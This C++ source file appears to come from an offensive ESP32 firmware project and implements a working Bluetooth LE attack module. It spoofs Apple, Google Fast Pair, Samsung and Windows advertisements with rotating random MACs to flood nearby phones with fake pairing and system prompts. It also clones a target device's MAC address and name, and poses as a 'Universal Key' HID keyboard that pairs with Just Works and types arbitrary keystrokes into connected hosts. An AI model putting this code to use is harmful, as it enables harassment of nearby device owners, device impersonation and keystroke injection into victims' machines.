/**
 * @file ble_spanner.cpp
 * @brief BLESpanner implementation
 */

#include "modules/ble/ble_spanner.h"
#include "modules/storage/settings_manager.h"
#include "modules/badusb/hid_keycodes.h"
#include "core/event_bus.h"
#include <esp_mac.h>
#include <esp_system.h>
#include <NimBLEDevice.h>
#include <esp_random.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include "nimble/nimble/host/include/host/ble_hs_id.h" // Required for ble_hs_id_set_rnd
#include "utils/log.h"

extern "C" {
    void esp_ble_gap_set_own_addr_type(uint8_t own_addr_type, bool useNRPA);
}


// Security Callbacks for HID Bonding
class HIDSecurityCallbacks : public NimBLESecurityCallbacks {
    uint32_t onPassKeyRequest() { return 123456; }
    void onPassKeyNotify(uint32_t pass_key) {}
    bool onConfirmPIN(uint32_t pass_key) { return true; }
    bool onSecurityRequest() { return true; }
    void onAuthenticationComplete(ble_gap_conn_desc* desc) {
        if (!desc->sec_state.encrypted) {
            LOG_E("BLE", "Auth Failed: Not Encrypted");
            // Feed the reconnect-storm guard: a failed auth is the signature of a host retrying a
            // stale bond against our identity (ADR-0134).
            adversary::BLESpanner::getInstance().notifyAuthResult(false);
            return;
        }
        LOG_I("BLE", "Auth Complete. Bonded: %d, Encrypted: %d",
            desc->sec_state.bonded, desc->sec_state.encrypted);
        adversary::BLESpanner::getInstance().notifyAuthResult(true);
    }
};

static HIDSecurityCallbacks securityCallbacks;

namespace adversary {


BLESpanner::BLESpanner() : 
    m_active(false), 
    m_taskRunning(false),
    m_packetCount(0), 
    m_interactionCount(0), 
    m_connectedCount(0),
    m_pps(0), 
    m_lastUpdate(0),
    m_layout(KeyboardLayout::US),
    m_pAdvertising(nullptr),
    m_pServer(nullptr),
    m_taskHandle(nullptr),
    m_lastModelIdx(0),
    m_hidLinkEncrypted(false),
    m_hidAdvertiseSuppressed(false)
{
    esp_read_mac(m_originalMac, ESP_MAC_BT);
}

void BLESpanner::start(const BleSpamConfig& config) {
    if (m_active) stop();

    m_config = config;
    m_packetCount = 0;
    m_interactionCount = 0;
    m_lastUpdate = millis();
    m_active = true;

    // Fresh start: clear the reconnect-storm state so a prior session's churn never carries over
    // and advertising is allowed again (ADR-0134).
    m_churnGuard.reset();
    m_hidLinkEncrypted = false;
    m_hidAdvertiseSuppressed = false;
    
    // For HID mode: If stack is already initialized (restart), query actual connection count
    // instead of resetting to 0, since the connection may persist across stop/start
    if (config.provider == BleSpamProvider::HID_KEYBOARD && 
        NimBLEDevice::getInitialized() && m_pServer != nullptr) {
        m_connectedCount = m_pServer->getConnectedCount();
        LOG_I("BLE", "HID restart: %d existing connection(s) detected", (int)m_connectedCount);
    } else {
        m_connectedCount = 0;
    }
    
    // Only clear handles if not reusing (for non-HID or first start)
    if (!NimBLEDevice::getInitialized()) {
        m_pHidInput = nullptr;
        m_pAdvertising = nullptr;
    }

    // Initialize Stack ON MAIN THREAD (Core 1) to prevent deinit race conditions
    // Ensure clean state
    esp_base_mac_addr_set(m_originalMac);
    
    if (!NimBLEDevice::getInitialized()) {
        LOG_I("BLE", "Starting NimBLE init...");
        NimBLEDevice::init("ADV-BLE");
        NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    }
    
    // Ensure we reuse existing objects if Soft Stopped
    if (!m_pServer) {
        m_pServer = NimBLEDevice::createServer();
        m_pServer->setCallbacks(this, false);  // false = we own this (singleton, don't delete)
    }
    // Re-enable auto-re-advertise on every start: a previous session's reconnect-storm trip may
    // have turned it off (ADR-0134).
    m_pServer->advertiseOnDisconnect(true);

    // HID / BadBLE Security Configuration
    if (m_config.provider == BleSpamProvider::HID_KEYBOARD) {
        NimBLEDevice::setSecurityAuth(true, false, true); // Bond=YES, MITM=NO, SC=YES (Just Works)
        NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);
        NimBLEDevice::setSecurityInitKey(BLE_SM_PAIR_KEY_DIST_ENC | BLE_SM_PAIR_KEY_DIST_ID);
        NimBLEDevice::setSecurityRespKey(BLE_SM_PAIR_KEY_DIST_ENC | BLE_SM_PAIR_KEY_DIST_ID);
        NimBLEDevice::setSecurityCallbacks(&securityCallbacks);
    }
    
    if (!m_pAdvertising) {
        m_pAdvertising = NimBLEDevice::getAdvertising();
    }
    

    // Force GAP Name for HID (Overrides init default)
    if (m_config.provider == BleSpamProvider::HID_KEYBOARD) {
        NimBLEDevice::setDeviceName("Universal Key");
    }

    // Configure basic settings
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    randomSeed(esp_random());

    // HID identity (ADR-0134): fresh random identity by default, fixed public identity opt-in.
    // The default sidesteps the endless-reconnect loop, where a host keeps a stale LTK keyed to a
    // fixed identity after a reflash and spins trying to encrypt against our wiped key. A fresh
    // random address each session never matches that stale bond, so the host always pairs clean.
    if (m_config.provider == BleSpamProvider::HID_KEYBOARD) {
        NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_PUBLIC);

        const char* fixedMac = SettingsManager::getInstance().get().wireless.fixedBleMac;
        uint8_t mac[6];
        unsigned int m[6];
        if (fixedMac[0] != '\0' &&
            sscanf(fixedMac, "%02X:%02X:%02X:%02X:%02X:%02X",
                   &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
            // Opt-in persistence: a stable identity the host silently reconnects to across
            // sessions. Caveat: after a reflash the host's stale bond must be forgotten to
            // re-pair; the reconnect-storm guard bounds that case instead of looping.
            for (int i = 0; i < 6; i++) mac[i] = (uint8_t)m[i];
            esp_base_mac_addr_set(mac);
            LOG_I("BLE", "HID fixed MAC (persistent identity): %s", fixedMac);
        } else {
            if (fixedMac[0] != '\0') {
                LOG_W("BLE", "Invalid Fixed MAC format, using a fresh random identity.");
            }
            // Default: a fresh random identity so no host's stale bond can match. Inject-and-go
            // needs no cross-session persistence.
            generateRandomMac();
            LOG_I("BLE", "HID fresh random identity (no stale-bond collision).");
        }
    }

    // Configure ADV interval - standard intervals for stability
    m_pAdvertising->setMinInterval(0x20); // 20ms
    m_pAdvertising->setMaxInterval(0x40); // 40ms
    m_pAdvertising->setScanResponse(true);

    // Initial payload
    updatePayload();

    // If HID mode, initialize HID service
    if (m_config.provider == BleSpamProvider::HID_KEYBOARD) {
        NimBLEService* pHidService = m_pServer->getServiceByUUID(NimBLEUUID((uint16_t)0x1812));
        if (!pHidService) {
            pHidService = m_pServer->createService(NimBLEUUID((uint16_t)0x1812));
            
            // HID Report Map (Simplified: Input ONLY, No LEDs/Output)
            const uint8_t reportMap[] = {
                0x05, 0x01, 0x09, 0x06, 0xa1, 0x01,       // Usage Page (Generic Desktop), Usage (Keyboard), Collection (Application)
                0x05, 0x07, 0x19, 0xe0, 0x29, 0xe7,       // Usage Page (Key Codes), Usage Min (224), Usage Max (231)
                0x15, 0x00, 0x25, 0x01,                   // Logical Min (0), Logical Max (1)
                0x75, 0x01, 0x95, 0x08,                   // Report Size (1), Report Count (8)
                0x81, 0x02,                               // Input (Data, Variable, Absolute) -> Modifiers
                0x95, 0x01, 0x75, 0x08,                   // Report Count (1), Report Size (8)
                0x81, 0x01,                               // Input (Constant) -> Reserved byte
                0x95, 0x06, 0x75, 0x08,                   // Report Count (6), Report Size (8)
                0x15, 0x00, 0x25, 0x65,                   // Logical Min (0), Logical Max (101)
                0x05, 0x07, 0x19, 0x00, 0x29, 0x65,       // Usage Page (Key Codes), Usage Min (0), Usage Max (101)
                0x81, 0x00,                               // Input (Data, Array) -> Key arrays
                0xc0                                      // End Collection
            };
            pHidService->createCharacteristic(NimBLEUUID((uint16_t)0x2a4b))->setValue(reportMap, sizeof(reportMap));
            
            // HID Input Report (Force Encryption to trigger Bonding)
            m_pHidInput = pHidService->createCharacteristic(
                NimBLEUUID((uint16_t)0x2a4d), 
                NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::READ_ENC | 
                NIMBLE_PROPERTY::NOTIFY
            );
            
            // Report Reference Descriptor (Mandatory for HID over GATT)
            // 0x2908 -> [Report ID (0), Report Type (1=Input)]
            uint8_t repRef[] = {0x00, 0x01};
            m_pHidInput->createDescriptor(NimBLEUUID((uint16_t)0x2908))->setValue(repRef, 2);
            
            // Protocol Mode (Mandatory): 1 = Report Protocol
            uint8_t protoMode = 1; 
            pHidService->createCharacteristic(NimBLEUUID((uint16_t)0x2a4e), NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE_NR)->setValue(&protoMode, 1);
            
            // HID Control Point (Mandatory)
            pHidService->createCharacteristic(NimBLEUUID((uint16_t)0x2a4c), NIMBLE_PROPERTY::WRITE_NR)->setValue((uint8_t)0); // Init 0
            
            // PnP ID (0x2A50) - Essential for Windows/Linux
            NimBLEService* pDisService = m_pServer->getServiceByUUID(NimBLEUUID((uint16_t)0x180A));
            if (!pDisService) {
                pDisService = m_pServer->createService(NimBLEUUID((uint16_t)0x180A));
                const uint8_t pnp[] = {0x02, 0x8A, 0x24, 0x66, 0x82, 0x01, 0x00}; // USB, Vendor, Product, Version
                pDisService->createCharacteristic(NimBLEUUID((uint16_t)0x2A50))->setValue(pnp, sizeof(pnp));
                pDisService->start();
            }

            // HID Information
            const uint8_t hidInfo[] = {0x11, 0x01, 0x00, 0x01}; // bcdHID, bCountryCode, Flags
            pHidService->createCharacteristic(NimBLEUUID((uint16_t)0x2a4a))->setValue(hidInfo, sizeof(hidInfo));
            
            pHidService->start();

            // Battery Service (Mandatory for some OSs like Linux)
            NimBLEService* pBatService = m_pServer->getServiceByUUID(NimBLEUUID((uint16_t)0x180F));
            if (!pBatService) {
                pBatService = m_pServer->createService(NimBLEUUID((uint16_t)0x180F));
                uint8_t batteryLevel = 100;
                pBatService->createCharacteristic(NimBLEUUID((uint16_t)0x2A19), NIMBLE_PROPERTY::READ)
                    ->setValue(&batteryLevel, 1);
                pBatService->start();
            }

            // Start the Server to accept connections
            m_pServer->start(); // Re-enabled for testing (Popup fix?)
            LOG_I("BLE", "HID Service started");
        } else {
            // Service already exists from previous start - re-fetch characteristic pointer
            m_pHidInput = pHidService->getCharacteristic(NimBLEUUID((uint16_t)0x2a4d));
            LOG_D("BLE", "getCharacteristic returned: %p", (void*)m_pHidInput);
            if (m_pHidInput) {
                LOG_I("BLE", "HID Service reused, characteristic re-acquired");
            } else {
                LOG_E("BLE", "HID Input characteristic not found!");
            }
            // IMPORTANT: Re-start the server after deinit/reinit cycle
            m_pServer->start();
            LOG_I("BLE", "Server re-started for reused HID service");
        }
        
        // Appearance and the HID service UUID are already carried by the custom advertisement data
        // set in updatePayload() (setAdvertisementData flips NimBLE's m_customAdvData, after which
        // these piecemeal setters are ignored). The old hardcoded setAppearance(0x03C1) here was a
        // dead no-op that also wrongly implied the appearance is forced to keyboard.
    }

    // Start background task
    if (m_taskHandle == nullptr) {
        xTaskCreatePinnedToCore(
            spamTask,
            "BLESpannerTask",
            4096,
            this,
            1, // Low priority to avoid starving UI
            &m_taskHandle,
            0 // Run on Core 0 (where NimBLE usually lives)
        );
    }
}

// stop() is much simpler now
void BLESpanner::stop() {
    if (!m_active) return;
    
    m_active = false;
    LOG_I("BLE", "Stopping background task...");
    
    // Wait for task to signal it's exiting
    uint32_t stopTimeout = millis();
    while (m_taskRunning && (millis() - stopTimeout < 3000)) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    if (m_taskHandle != nullptr) {
        // Task cleans itself up via vTaskDelete(NULL)
        m_taskHandle = nullptr;
    }
    
    // Give the task a moment to actually exit the scheduler
    vTaskDelay(pdMS_TO_TICKS(100));

    if (m_pAdvertising) {
        m_pAdvertising->stop();
    }

    // For HID mode: DO NOT call deinit() - this corrupts internal handles!
    // Just stop advertising and let the connection drop naturally.
    // The BLE stack and services remain intact for quick restart.
    if (m_config.provider == BleSpamProvider::HID_KEYBOARD) {
        LOG_I("BLE", "HID mode - skipping deinit to preserve stack state");
        // Just stop advertising, don't tear down the stack
        if (m_pAdvertising) m_pAdvertising->stop();
        // Note: We do NOT null m_pServer or m_pAdvertising for HID mode
    } else {
        // For spam/other modes: Full shutdown needed for MAC rotation
        if (NimBLEDevice::getInitialized()) {
            vTaskDelay(pdMS_TO_TICKS(100));
            
            LOG_I("BLE", "Stopping Advertising...");
            if (m_pAdvertising) m_pAdvertising->stop();

            vTaskDelay(pdMS_TO_TICKS(100));

            LOG_I("BLE", "Releasing controller radio (deinit false)...");
            try {
                NimBLEDevice::deinit(false);
            } catch (...) {
                LOG_E("BLE", "Exception during radio deinit");
            }
            
            m_pServer = nullptr;
            m_pAdvertising = nullptr;
        }
    }

    // Restore base MAC
    esp_base_mac_addr_set(m_originalMac);
    LOG_I("BLE", "Spanner stopped.");
}

void BLESpanner::forceRelease() {
    // Called during screen transitions — we MUST free heap
    // even if HID mode would prefer to keep the stack alive.
    // This is safe because the next BLE screen will re-init.
    if (m_active) {
        stop();
    }
    
    if (NimBLEDevice::getInitialized()) {
        LOG_I("BLE", "Force releasing NimBLE stack (screen transition)...");
        if (m_pAdvertising) {
            m_pAdvertising->stop();
        }
        delay(100);
        try {
            // Prevent deinit(true) from deleting static objects:
            // - Server callbacks: already safe via setCallbacks(this, false) in start()
            // - Security callbacks: null the pointer so deinit skips the delete
            NimBLEDevice::setSecurityCallbacks(nullptr);
            
            // Use deinit(true) to clear ALL services/characteristics.
            // deinit(false) leaves stale service objects that get "reused"
            // on re-init, but with invalid BLE handles — HID keys silently fail.
            NimBLEDevice::deinit(true);
        } catch (...) {
            LOG_E("BLE", "Exception during forced deinit");
        }
        m_pServer = nullptr;
        m_pAdvertising = nullptr;
        m_pHidInput = nullptr;
        LOG_I("BLE", "Stack released. Heap: %u", (unsigned int)ESP.getFreeHeap());
    }
}

void BLESpanner::spamTask(void* pvParameters) {
    BLESpanner* instance = (BLESpanner*)pvParameters;
    instance->m_taskRunning = true;
    
    // For HID/BadBLE, we want a STABLE address, not rotation
    if (instance->m_config.provider == BleSpamProvider::HID_KEYBOARD) {
        // instance->runSpamCycle(); // SKIP rotation!
        instance->updatePayload();   // Just build the ADV packet
        instance->m_pAdvertising->start();
        
        while (instance->m_active) {
             vTaskDelay(pdMS_TO_TICKS(100)); // Just wait until stopped
        }
        
        // Cleanup
        if (instance->m_pAdvertising) instance->m_pAdvertising->stop();
        instance->m_taskRunning = false;
        vTaskDelete(NULL);
        return;
    }

    // DELAY for safety: Ensure previous deinit (scanner) is 100% done
    vTaskDelay(pdMS_TO_TICKS(200));

    // Stack is already initialized in start()
    
    while (instance->m_active) {
        // 1. Rotate Address & Update Payload
        instance->runSpamCycle(); // Now returns immediately after setting addr/payload
        
        // 2. Start Advertising (Burst)
        instance->m_pAdvertising->start();
        
        // 3. Burst window - 5 seconds per MAC for stable detection
        for (int i = 0; i < 100 && instance->m_active; i++) {
            vTaskDelay(pdMS_TO_TICKS(50)); // 100 * 50ms = 5 seconds
        }
        
        // 4. Stop to prepare for next rotation
        if (instance->m_pAdvertising) {
            instance->m_pAdvertising->stop();
        }
        
        // 5. Gap for controller stability
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    // Final cleanup as task exits
    if (instance->m_pAdvertising) {
        instance->m_pAdvertising->stop();
    }
    
    instance->m_taskRunning = false;
    vTaskDelete(NULL);
}

void BLESpanner::runSpamCycle() {
    m_packetCount = m_packetCount + 1;
    uint32_t interval = 1100 - (m_config.intensity * 100);
    if (interval < 200) interval = 200; // Can go much faster now!
    m_pps = 1000.0f / (float)interval;

    // Fast Rotation using Random Address (No deinit needed!)
    if (m_pAdvertising->isAdvertising()) {
        m_pAdvertising->stop();
    }
    
    // Pure Random MAC with Static Random Address bits (7:6 = 11)
    uint8_t mac[6];
    if (m_config.provider == BleSpamProvider::CLONE && !m_spoofTarget.name.empty()) {
        // Use target MAC (reverse order for ble_hs_id_set_rnd)
        const uint8_t* native = m_spoofTarget.address.getNative();
        for(int i=0; i<6; i++) mac[i] = native[i];
    } else {
        esp_fill_random(mac, 6);
        mac[5] |= 0xC0; // Set bits for Static Random Address
    }
    
    // Set random address in host stack
    // Set random address in host stack
    int rc = ble_hs_id_set_rnd(mac);
    if (rc != 0) {
        LOG_E("BLE", "Failed to set random addr: %d", rc);
    } else {
        // Only print if successful
        LOG_D("BLE", "MAC Rotated to %02X:%02X:%02X:%02X:%02X:%02X",
            mac[5], mac[4], mac[3], mac[2], mac[1], mac[0]);
    }

    // Configure to use Random Address
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    
    
    updatePayload();
    // m_pAdvertising->start(); // Moved to main loop
}

void BLESpanner::generateRandomMac() {
    // Fully random so the identity carries no recognizable prefix and never repeats across
    // sessions (ADR-0134). The two forced bits keep it a valid unicast, locally administered
    // address.
    uint8_t mac[6];
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)(esp_random() & 0xFF);
    mac[0] &= 0xFE; // Force Unicast (clear the multicast bit)
    mac[0] |= 0x02; // Force Locally Administered

    esp_err_t err = esp_base_mac_addr_set(mac);
    if (err != ESP_OK) {
        LOG_E("BLE", "MAC rotation error: %d", err);
    } else {
        LOG_D("BLE", "MAC rotated to %02X:%02X:%02X...", mac[0], mac[1], mac[2]);
    }
}

void BLESpanner::setIntensity(uint8_t level) {
    if (!m_pAdvertising) return;
    
    m_config.intensity = level;
    // Map intensity 1-10 to intervals 500ms down to 20ms
    uint32_t interval = 500 - (uint32_t)(level - 1) * 50;
    if (interval < 20) interval = 20;
    
    m_pAdvertising->setMinInterval(interval / 0.625);
    m_pAdvertising->setMaxInterval(interval / 0.625);
}

void BLESpanner::setLayout(KeyboardLayout layout) {
    m_layout = layout;
    LOG_I("BLE", "Keyboard Layout set to: %s", (layout == KeyboardLayout::US) ? "US" : "ES");
}

void BLESpanner::update() {
    // UI just reads telemetry, no blocking logic here
}

void BLESpanner::onConnect(NimBLEServer* pServer) {
    m_connectedCount = m_connectedCount + 1;
    m_interactionCount = m_interactionCount + 1;
    m_lastPayload = "> CONNECTED [!]";
    LOG_I("BLE", "Device connected!");

    // A new link starts unencrypted; notifyAuthResult(true) flips this once SMP succeeds. A drop
    // while still false is a failed-auth reconnect that feeds the storm guard (ADR-0134).
    m_hidLinkEncrypted = false;

    // Trigger semantic event for notification
    EventData event(EventType::BLE_CONNECTED);
    EventBus::getInstance().publish(event);
}

void BLESpanner::onDisconnect(NimBLEServer* pServer) {
    if (m_connectedCount > 0) m_connectedCount = m_connectedCount - 1;
    LOG_I("BLE", "Device disconnected");

    // Loop-breaker (ADR-0134): a HID link that drops before it ever encrypted is a failed-auth
    // reconnect, the signature of a host retrying a stale bond. Count the churn; once it storms,
    // stop auto-re-advertising so the device stops spinning and the operator sees why.
    if (m_config.provider == BleSpamProvider::HID_KEYBOARD && !m_hidLinkEncrypted) {
        if (m_churnGuard.recordFailure(millis())) {
            m_hidAdvertiseSuppressed = true;
            if (m_pServer) m_pServer->advertiseOnDisconnect(false);
            NimBLEDevice::stopAdvertising();
            m_lastPayload = "RE-PAIR: forget on host";
            LOG_W("BLE", "Reconnect storm: advertising stopped. Forget this device on the host, "
                         "then restart BadBLE.");
        }
    }
}

void BLESpanner::notifyAuthResult(bool encrypted) {
    m_hidLinkEncrypted = encrypted;
    // A clean encrypted link means the churn (if any) is over; let advertising recover next drop.
    if (encrypted) m_churnGuard.reset();
}

void BLESpanner::updatePayload() {
    if (!m_pAdvertising) return;

    struct GfpsProfile { uint32_t id; const char* name; };
    // Verified Fast Pair Model IDs - sequential rotation for maximum unique popups
    static const GfpsProfile profiles[] = {
        // A larger list of model IDs will
        // bloat the android cache and trigger a popup limiting
        // NOTE: Model pool is currently static — Add dynamic 3-4 model selection from a larger list
        // on attack start if cache bloat becomes an issue.
        {0x00B26E, "Pixel Buds"},
        {0x92BBBD, "Sony WF-1000XM4"},
        {0xF52494, "JBL Live Pro+ TWS"},
        {0x72EF8D, "Razer Hammerhead TWS X"},
    };
    const int numProfiles = sizeof(profiles) / sizeof(profiles[0]);
    
    std::vector<uint8_t> finalP;
    const char* dName = "Adversary";

    if (m_config.provider == BleSpamProvider::ANDROID) {
        // Sequential rotation - ensures each Model ID gets used before repeating
        m_lastModelIdx = (m_lastModelIdx + 1) % numProfiles;
        
        GfpsProfile active = profiles[m_lastModelIdx];
        dName = active.name;
        
        LOG_D("BLE", "Spoofing [%d/%d]: %s (0x%06X)",
            m_lastModelIdx + 1, numProfiles, active.name, (unsigned int)active.id);

        // 1. Flags (3 bytes)
        finalP.push_back(0x02); finalP.push_back(0x01); finalP.push_back(0x06);
        
        // 2. TX Power (3 bytes) - Moved earlier to satisfly proximity timing
        finalP.push_back(0x02); finalP.push_back(0x0A); finalP.push_back(0x00);
        
        // 3. Appearance (4 bytes) - Fixed icon field
        finalP.push_back(0x03); finalP.push_back(0x19); 
        finalP.push_back(0x41); finalP.push_back(0x09); // 0x0941
        
        // 4. Complete 16-bit Service UUIDs (4 bytes)
        finalP.push_back(0x03); finalP.push_back(0x03); 
        finalP.push_back(0x2C); finalP.push_back(0xFE);
        
        // 5. Service Data (7 bytes)
        finalP.push_back(0x06); finalP.push_back(0x16); 
        finalP.push_back(0x2C); finalP.push_back(0xFE);
        finalP.push_back((uint8_t)(active.id >> 16));
        finalP.push_back((uint8_t)(active.id >> 8));
        finalP.push_back((uint8_t)active.id);

        NimBLEAdvertisementData advertData;
        advertData.addData((char*)finalP.data(), finalP.size());
        m_pAdvertising->setAdvertisementData(advertData);

        // Scan Response with Service UUID + Name
        NimBLEAdvertisementData scanResponse;
        std::vector<uint8_t> scanRaw;
        scanRaw.push_back(0x03); scanRaw.push_back(0x03);
        scanRaw.push_back(0x2C); scanRaw.push_back(0xFE);
        scanResponse.addData((char*)scanRaw.data(), scanRaw.size());
        scanResponse.setName(dName);
        m_pAdvertising->setScanResponseData(scanResponse);
        
        m_pAdvertising->setAdvertisementType(BLE_HCI_ADV_TYPE_ADV_IND);
    } else if (m_config.provider == BleSpamProvider::HID_KEYBOARD) {
        // Special handling for HID: Don't wrap in Manufacturer Data
        // The payload was built with Flags, UUIDs, Name, etc. in buildPayload()
        // But NimBLE's setAdvertisementData wraps everything in Len+Type structure automatically for some fields
        // So we need to set fields EXPLICITLY on NimBLEAdvertisementData instead of raw bytes
        
        // The primary advertisement MUST stay within the 31-byte legacy limit.
        // flags(3) + appearance(4) + HID service UUID(4) = 11 bytes. The device
        // name goes in the scan response so a long name (e.g. the default
        // "Universal Key") can't overflow the primary packet and make NimBLE
        // reject it ("Advertisement data length exceeded"), which would leave
        // the keyboard un-advertised and break reconnection.
        //
        // The old Microsoft Swift Pair manufacturer block was dropped: it pushed
        // the primary packet to 33 bytes, and Swift Pair only triggers the
        // Windows pairing popup from the *primary* advertisement — pointless for
        // an already-bonded HID keyboard.
        NimBLEAdvertisementData advertData;
        advertData.setFlags(0x06); // General Disc + BR/EDR Not Supported

        uint16_t appear = m_config.appearance;
        if (appear == 0) appear = 0x03C1; // Default Keyboard
        advertData.setAppearance(appear);

        advertData.setCompleteServices(NimBLEUUID((uint16_t)0x1812)); // HID Service
        m_pAdvertising->setAdvertisementData(advertData);

        // Scan response carries the full name (fits any reasonable length here).
        const char* dName = m_config.name;
        if (dName[0] == '\0') {
            dName = SettingsManager::getInstance().get().wireless.bleName;
            if (dName[0] == '\0') dName = "Universal Key";
        }
        NimBLEAdvertisementData scanResponse;
        scanResponse.setName(dName);
        m_pAdvertising->setScanResponseData(scanResponse);

        finalP = {0xDE, 0xAD, 0xBE, 0xEF}; // Dummy log data
    } else {
        finalP = buildPayload();
        NimBLEAdvertisementData advertData;
        advertData.setFlags(0x06);
        advertData.addTxPower();
        advertData.setManufacturerData(std::string((char*)finalP.data(), finalP.size()));
        m_pAdvertising->setAdvertisementData(advertData);
    }
    
    // Logging (Up to 32 bytes to avoid truncation)
    char hexBuf[128];
    char* logPtr = hexBuf;
    for (size_t i = 0; i < finalP.size() && i < 32; i++) {
        logPtr += sprintf(logPtr, "%02X ", finalP[i]);
    }
    m_lastPayload = hexBuf;
    LOG_D("BLE", "Payload: %s", hexBuf);
}

std::vector<uint8_t> BLESpanner::buildPayload() {
    std::vector<uint8_t> data;

    switch (m_config.provider) {
        case BleSpamProvider::APPLE: {
            data = {0x4C, 0x00};
            if (m_config.prompt == BleSpamPrompt::PAIRING) {
                // AirPods / Beats Models
                uint32_t appleModels[] = {0x0220, 0x0320, 0x0520, 0x0620, 0x0920, 0x0A20};
                uint32_t model = appleModels[esp_random() % (sizeof(appleModels)/4)];
                uint8_t body[] = {0x07, 0x19, 0x07, (uint8_t)(model >> 8), (uint8_t)model, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45};
                data.insert(data.end(), body, body + sizeof(body));
            } else {
                // Sour Apple (Proximity Action Types)
                uint8_t type = 0x27; // Default
                switch (m_config.prompt) {
                    case BleSpamPrompt::APPLE_ID_MODAL:   type = 0x09; break;
                    case BleSpamPrompt::SOFTWARE_UPDATE:  type = 0x02; break;
                    case BleSpamPrompt::TRANSFER_PHONE:   type = 0x27; break;
                    case BleSpamPrompt::GUIDED_ACCESS:    type = 0x2B; break;
                    default: {
                        uint8_t actionTypes[] = {0x27, 0x09, 0x02, 0x1E, 0x2B, 0x2D, 0x2F, 0x01, 0x06, 0x20, 0xC0};
                        type = actionTypes[esp_random() % sizeof(actionTypes)];
                    } break;
                }
                
                uint8_t body[] = {0x0F, 0x05, 0xC1, type, (uint8_t)(esp_random() % 256), (uint8_t)(esp_random() % 256), (uint8_t)(esp_random() % 256), 0x00, 0x00, 0x10, (uint8_t)(esp_random() % 256), (uint8_t)(esp_random() % 256), (uint8_t)(esp_random() % 256)};
                data.insert(data.end(), body, body + sizeof(body));
            }
            break;
        }
            
        case BleSpamProvider::HID_KEYBOARD: {
            // Linux/BlueZ Targeting: 
            // Needs AD Type 0x01 (Flags) to be discoverable
            // Needs AD Type 0x19 (Appearance) to be identified as Keyboard
            
            // 1. Flags (3 bytes)
            // 0x06 = General Discoverable | BR/EDR Not Supported
            data.push_back(0x02); data.push_back(0x01); data.push_back(0x06);
            
            // 2. Service UUIDs (16-bit) (4 bytes)
            // 0x1812 = HID Service
            data.push_back(0x03); data.push_back(0x03); 
            data.push_back(0x12); data.push_back(0x18);
            
            // 3. Appearance (4 bytes)
            // 0x03C1 = Keyboard
            data.push_back(0x03); data.push_back(0x19); 
            data.push_back(0xC1); data.push_back(0x03);
            
            // 4. Local Name (Complete or Shortened)
            // "Universal Key" fits well
            const char* name = "Universal Key";
            size_t nameLen = strlen(name);
            data.push_back(nameLen + 1);
            data.push_back(0x09); // Complete Local Name
            for (size_t i = 0; i < nameLen; i++) data.push_back(name[i]);
            break;
        }
            
        case BleSpamProvider::CLONE: {
            // Identity Spoofing: Use target name and appearance
            if (!m_spoofTarget.name.empty()) {
                m_pAdvertising->setName(m_spoofTarget.name);
            }
            // Add a generic manufacturer field or just empty
            data = {0x00, 0x00, 0x00}; 
            break;
        }
            
        case BleSpamProvider::WINDOWS: {
            data = {0x06, 0x00, 0x03, 0x00, 0x80};
            const char* names[] = {"Surface Dial", "Xbox Controller", "MS Mouse", "BT Keyboard", "Surface Headphones"};
            const char* name = names[esp_random() % (sizeof(names)/sizeof(char*))];
            for (size_t i = 0; name[i]; i++) data.push_back(name[i]);
            break;
        }

        case BleSpamProvider::SAMSUNG: {
            uint8_t prefix[] = {0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43};
            data.insert(data.end(), prefix, prefix + sizeof(prefix));
            uint8_t watchModels[] = {0x1A, 0x01, 0x15, 0x1E, 0x08, 0x0D}; // Watch4, Watch5, Watch6, Buds Pro
            data.push_back(watchModels[esp_random() % sizeof(watchModels)]);
            break;
        }
            
        case BleSpamProvider::CAROUSEL: {
            // Select random provider and recurse
            static uint32_t lastRotate = 0;
            static BleSpamProvider current = BleSpamProvider::APPLE;
            if (millis() - lastRotate > 2000) {
                current = (BleSpamProvider)(esp_random() % 4);
                lastRotate = millis();
            }
            m_config.provider = current;
            return buildPayload();
        }

        default:
            data = {0xFF, 0xFF, 0xDE, 0xAD, 0xBE, 0xEF};
            break;
    }

    return data;
}

void BLESpanner::sendKey(uint8_t keycode, uint8_t modifiers) {
    LOG_D("BLE", "sendKey called: m_pHidInput=%p, m_connectedCount=%d",
                  (void*)m_pHidInput, (int)m_connectedCount);
    if (!m_pHidInput || m_connectedCount == 0) {
        LOG_W("BLE", "sendKey failed: HidInput=%p, connCount=%d",
                     (void*)m_pHidInput, (int)m_connectedCount);
        return;
    }
    
    // HID Report: [modifiers, reserved(0), key1, key2, key3, key4, key5, key6]
    uint8_t report[8] = {modifiers, 0, keycode, 0, 0, 0, 0, 0};
    m_pHidInput->setValue(report, 8);
    m_pHidInput->setValue(report, 8);
    m_pHidInput->notify();
    LOG_D("BLE", "Key sent: 0x%02X (notify called)", keycode);
    
    vTaskDelay(pdMS_TO_TICKS(10));
    
    vTaskDelay(pdMS_TO_TICKS(10));
    
    // Release
    uint8_t release[8] = {0, 0, 0, 0, 0, 0, 0, 0};
    m_pHidInput->setValue(release, 8);
    m_pHidInput->notify();
    
    vTaskDelay(pdMS_TO_TICKS(10));
}

void BLESpanner::typeString(const std::string& text) {
    // Shared ASCII→HID tables live in hid_keycodes (single source of truth for
    // both the BadUSB and BadBLE paths); no local copy to keep in sync.
    const hid_keycodes::HidEntry* table = (m_layout == KeyboardLayout::ES)
        ? hid_keycodes::asciiToHid_ES
        : hid_keycodes::asciiToHid_US;

    for (char c : text) {
        uint8_t index = (uint8_t)c;
        if (index > 127) continue;

        uint8_t mod = table[index].modifiers;
        uint8_t key = table[index].usage;

        if (key != 0) {
            sendKey(key, mod);
        }
    }
}


} // namespace adversary
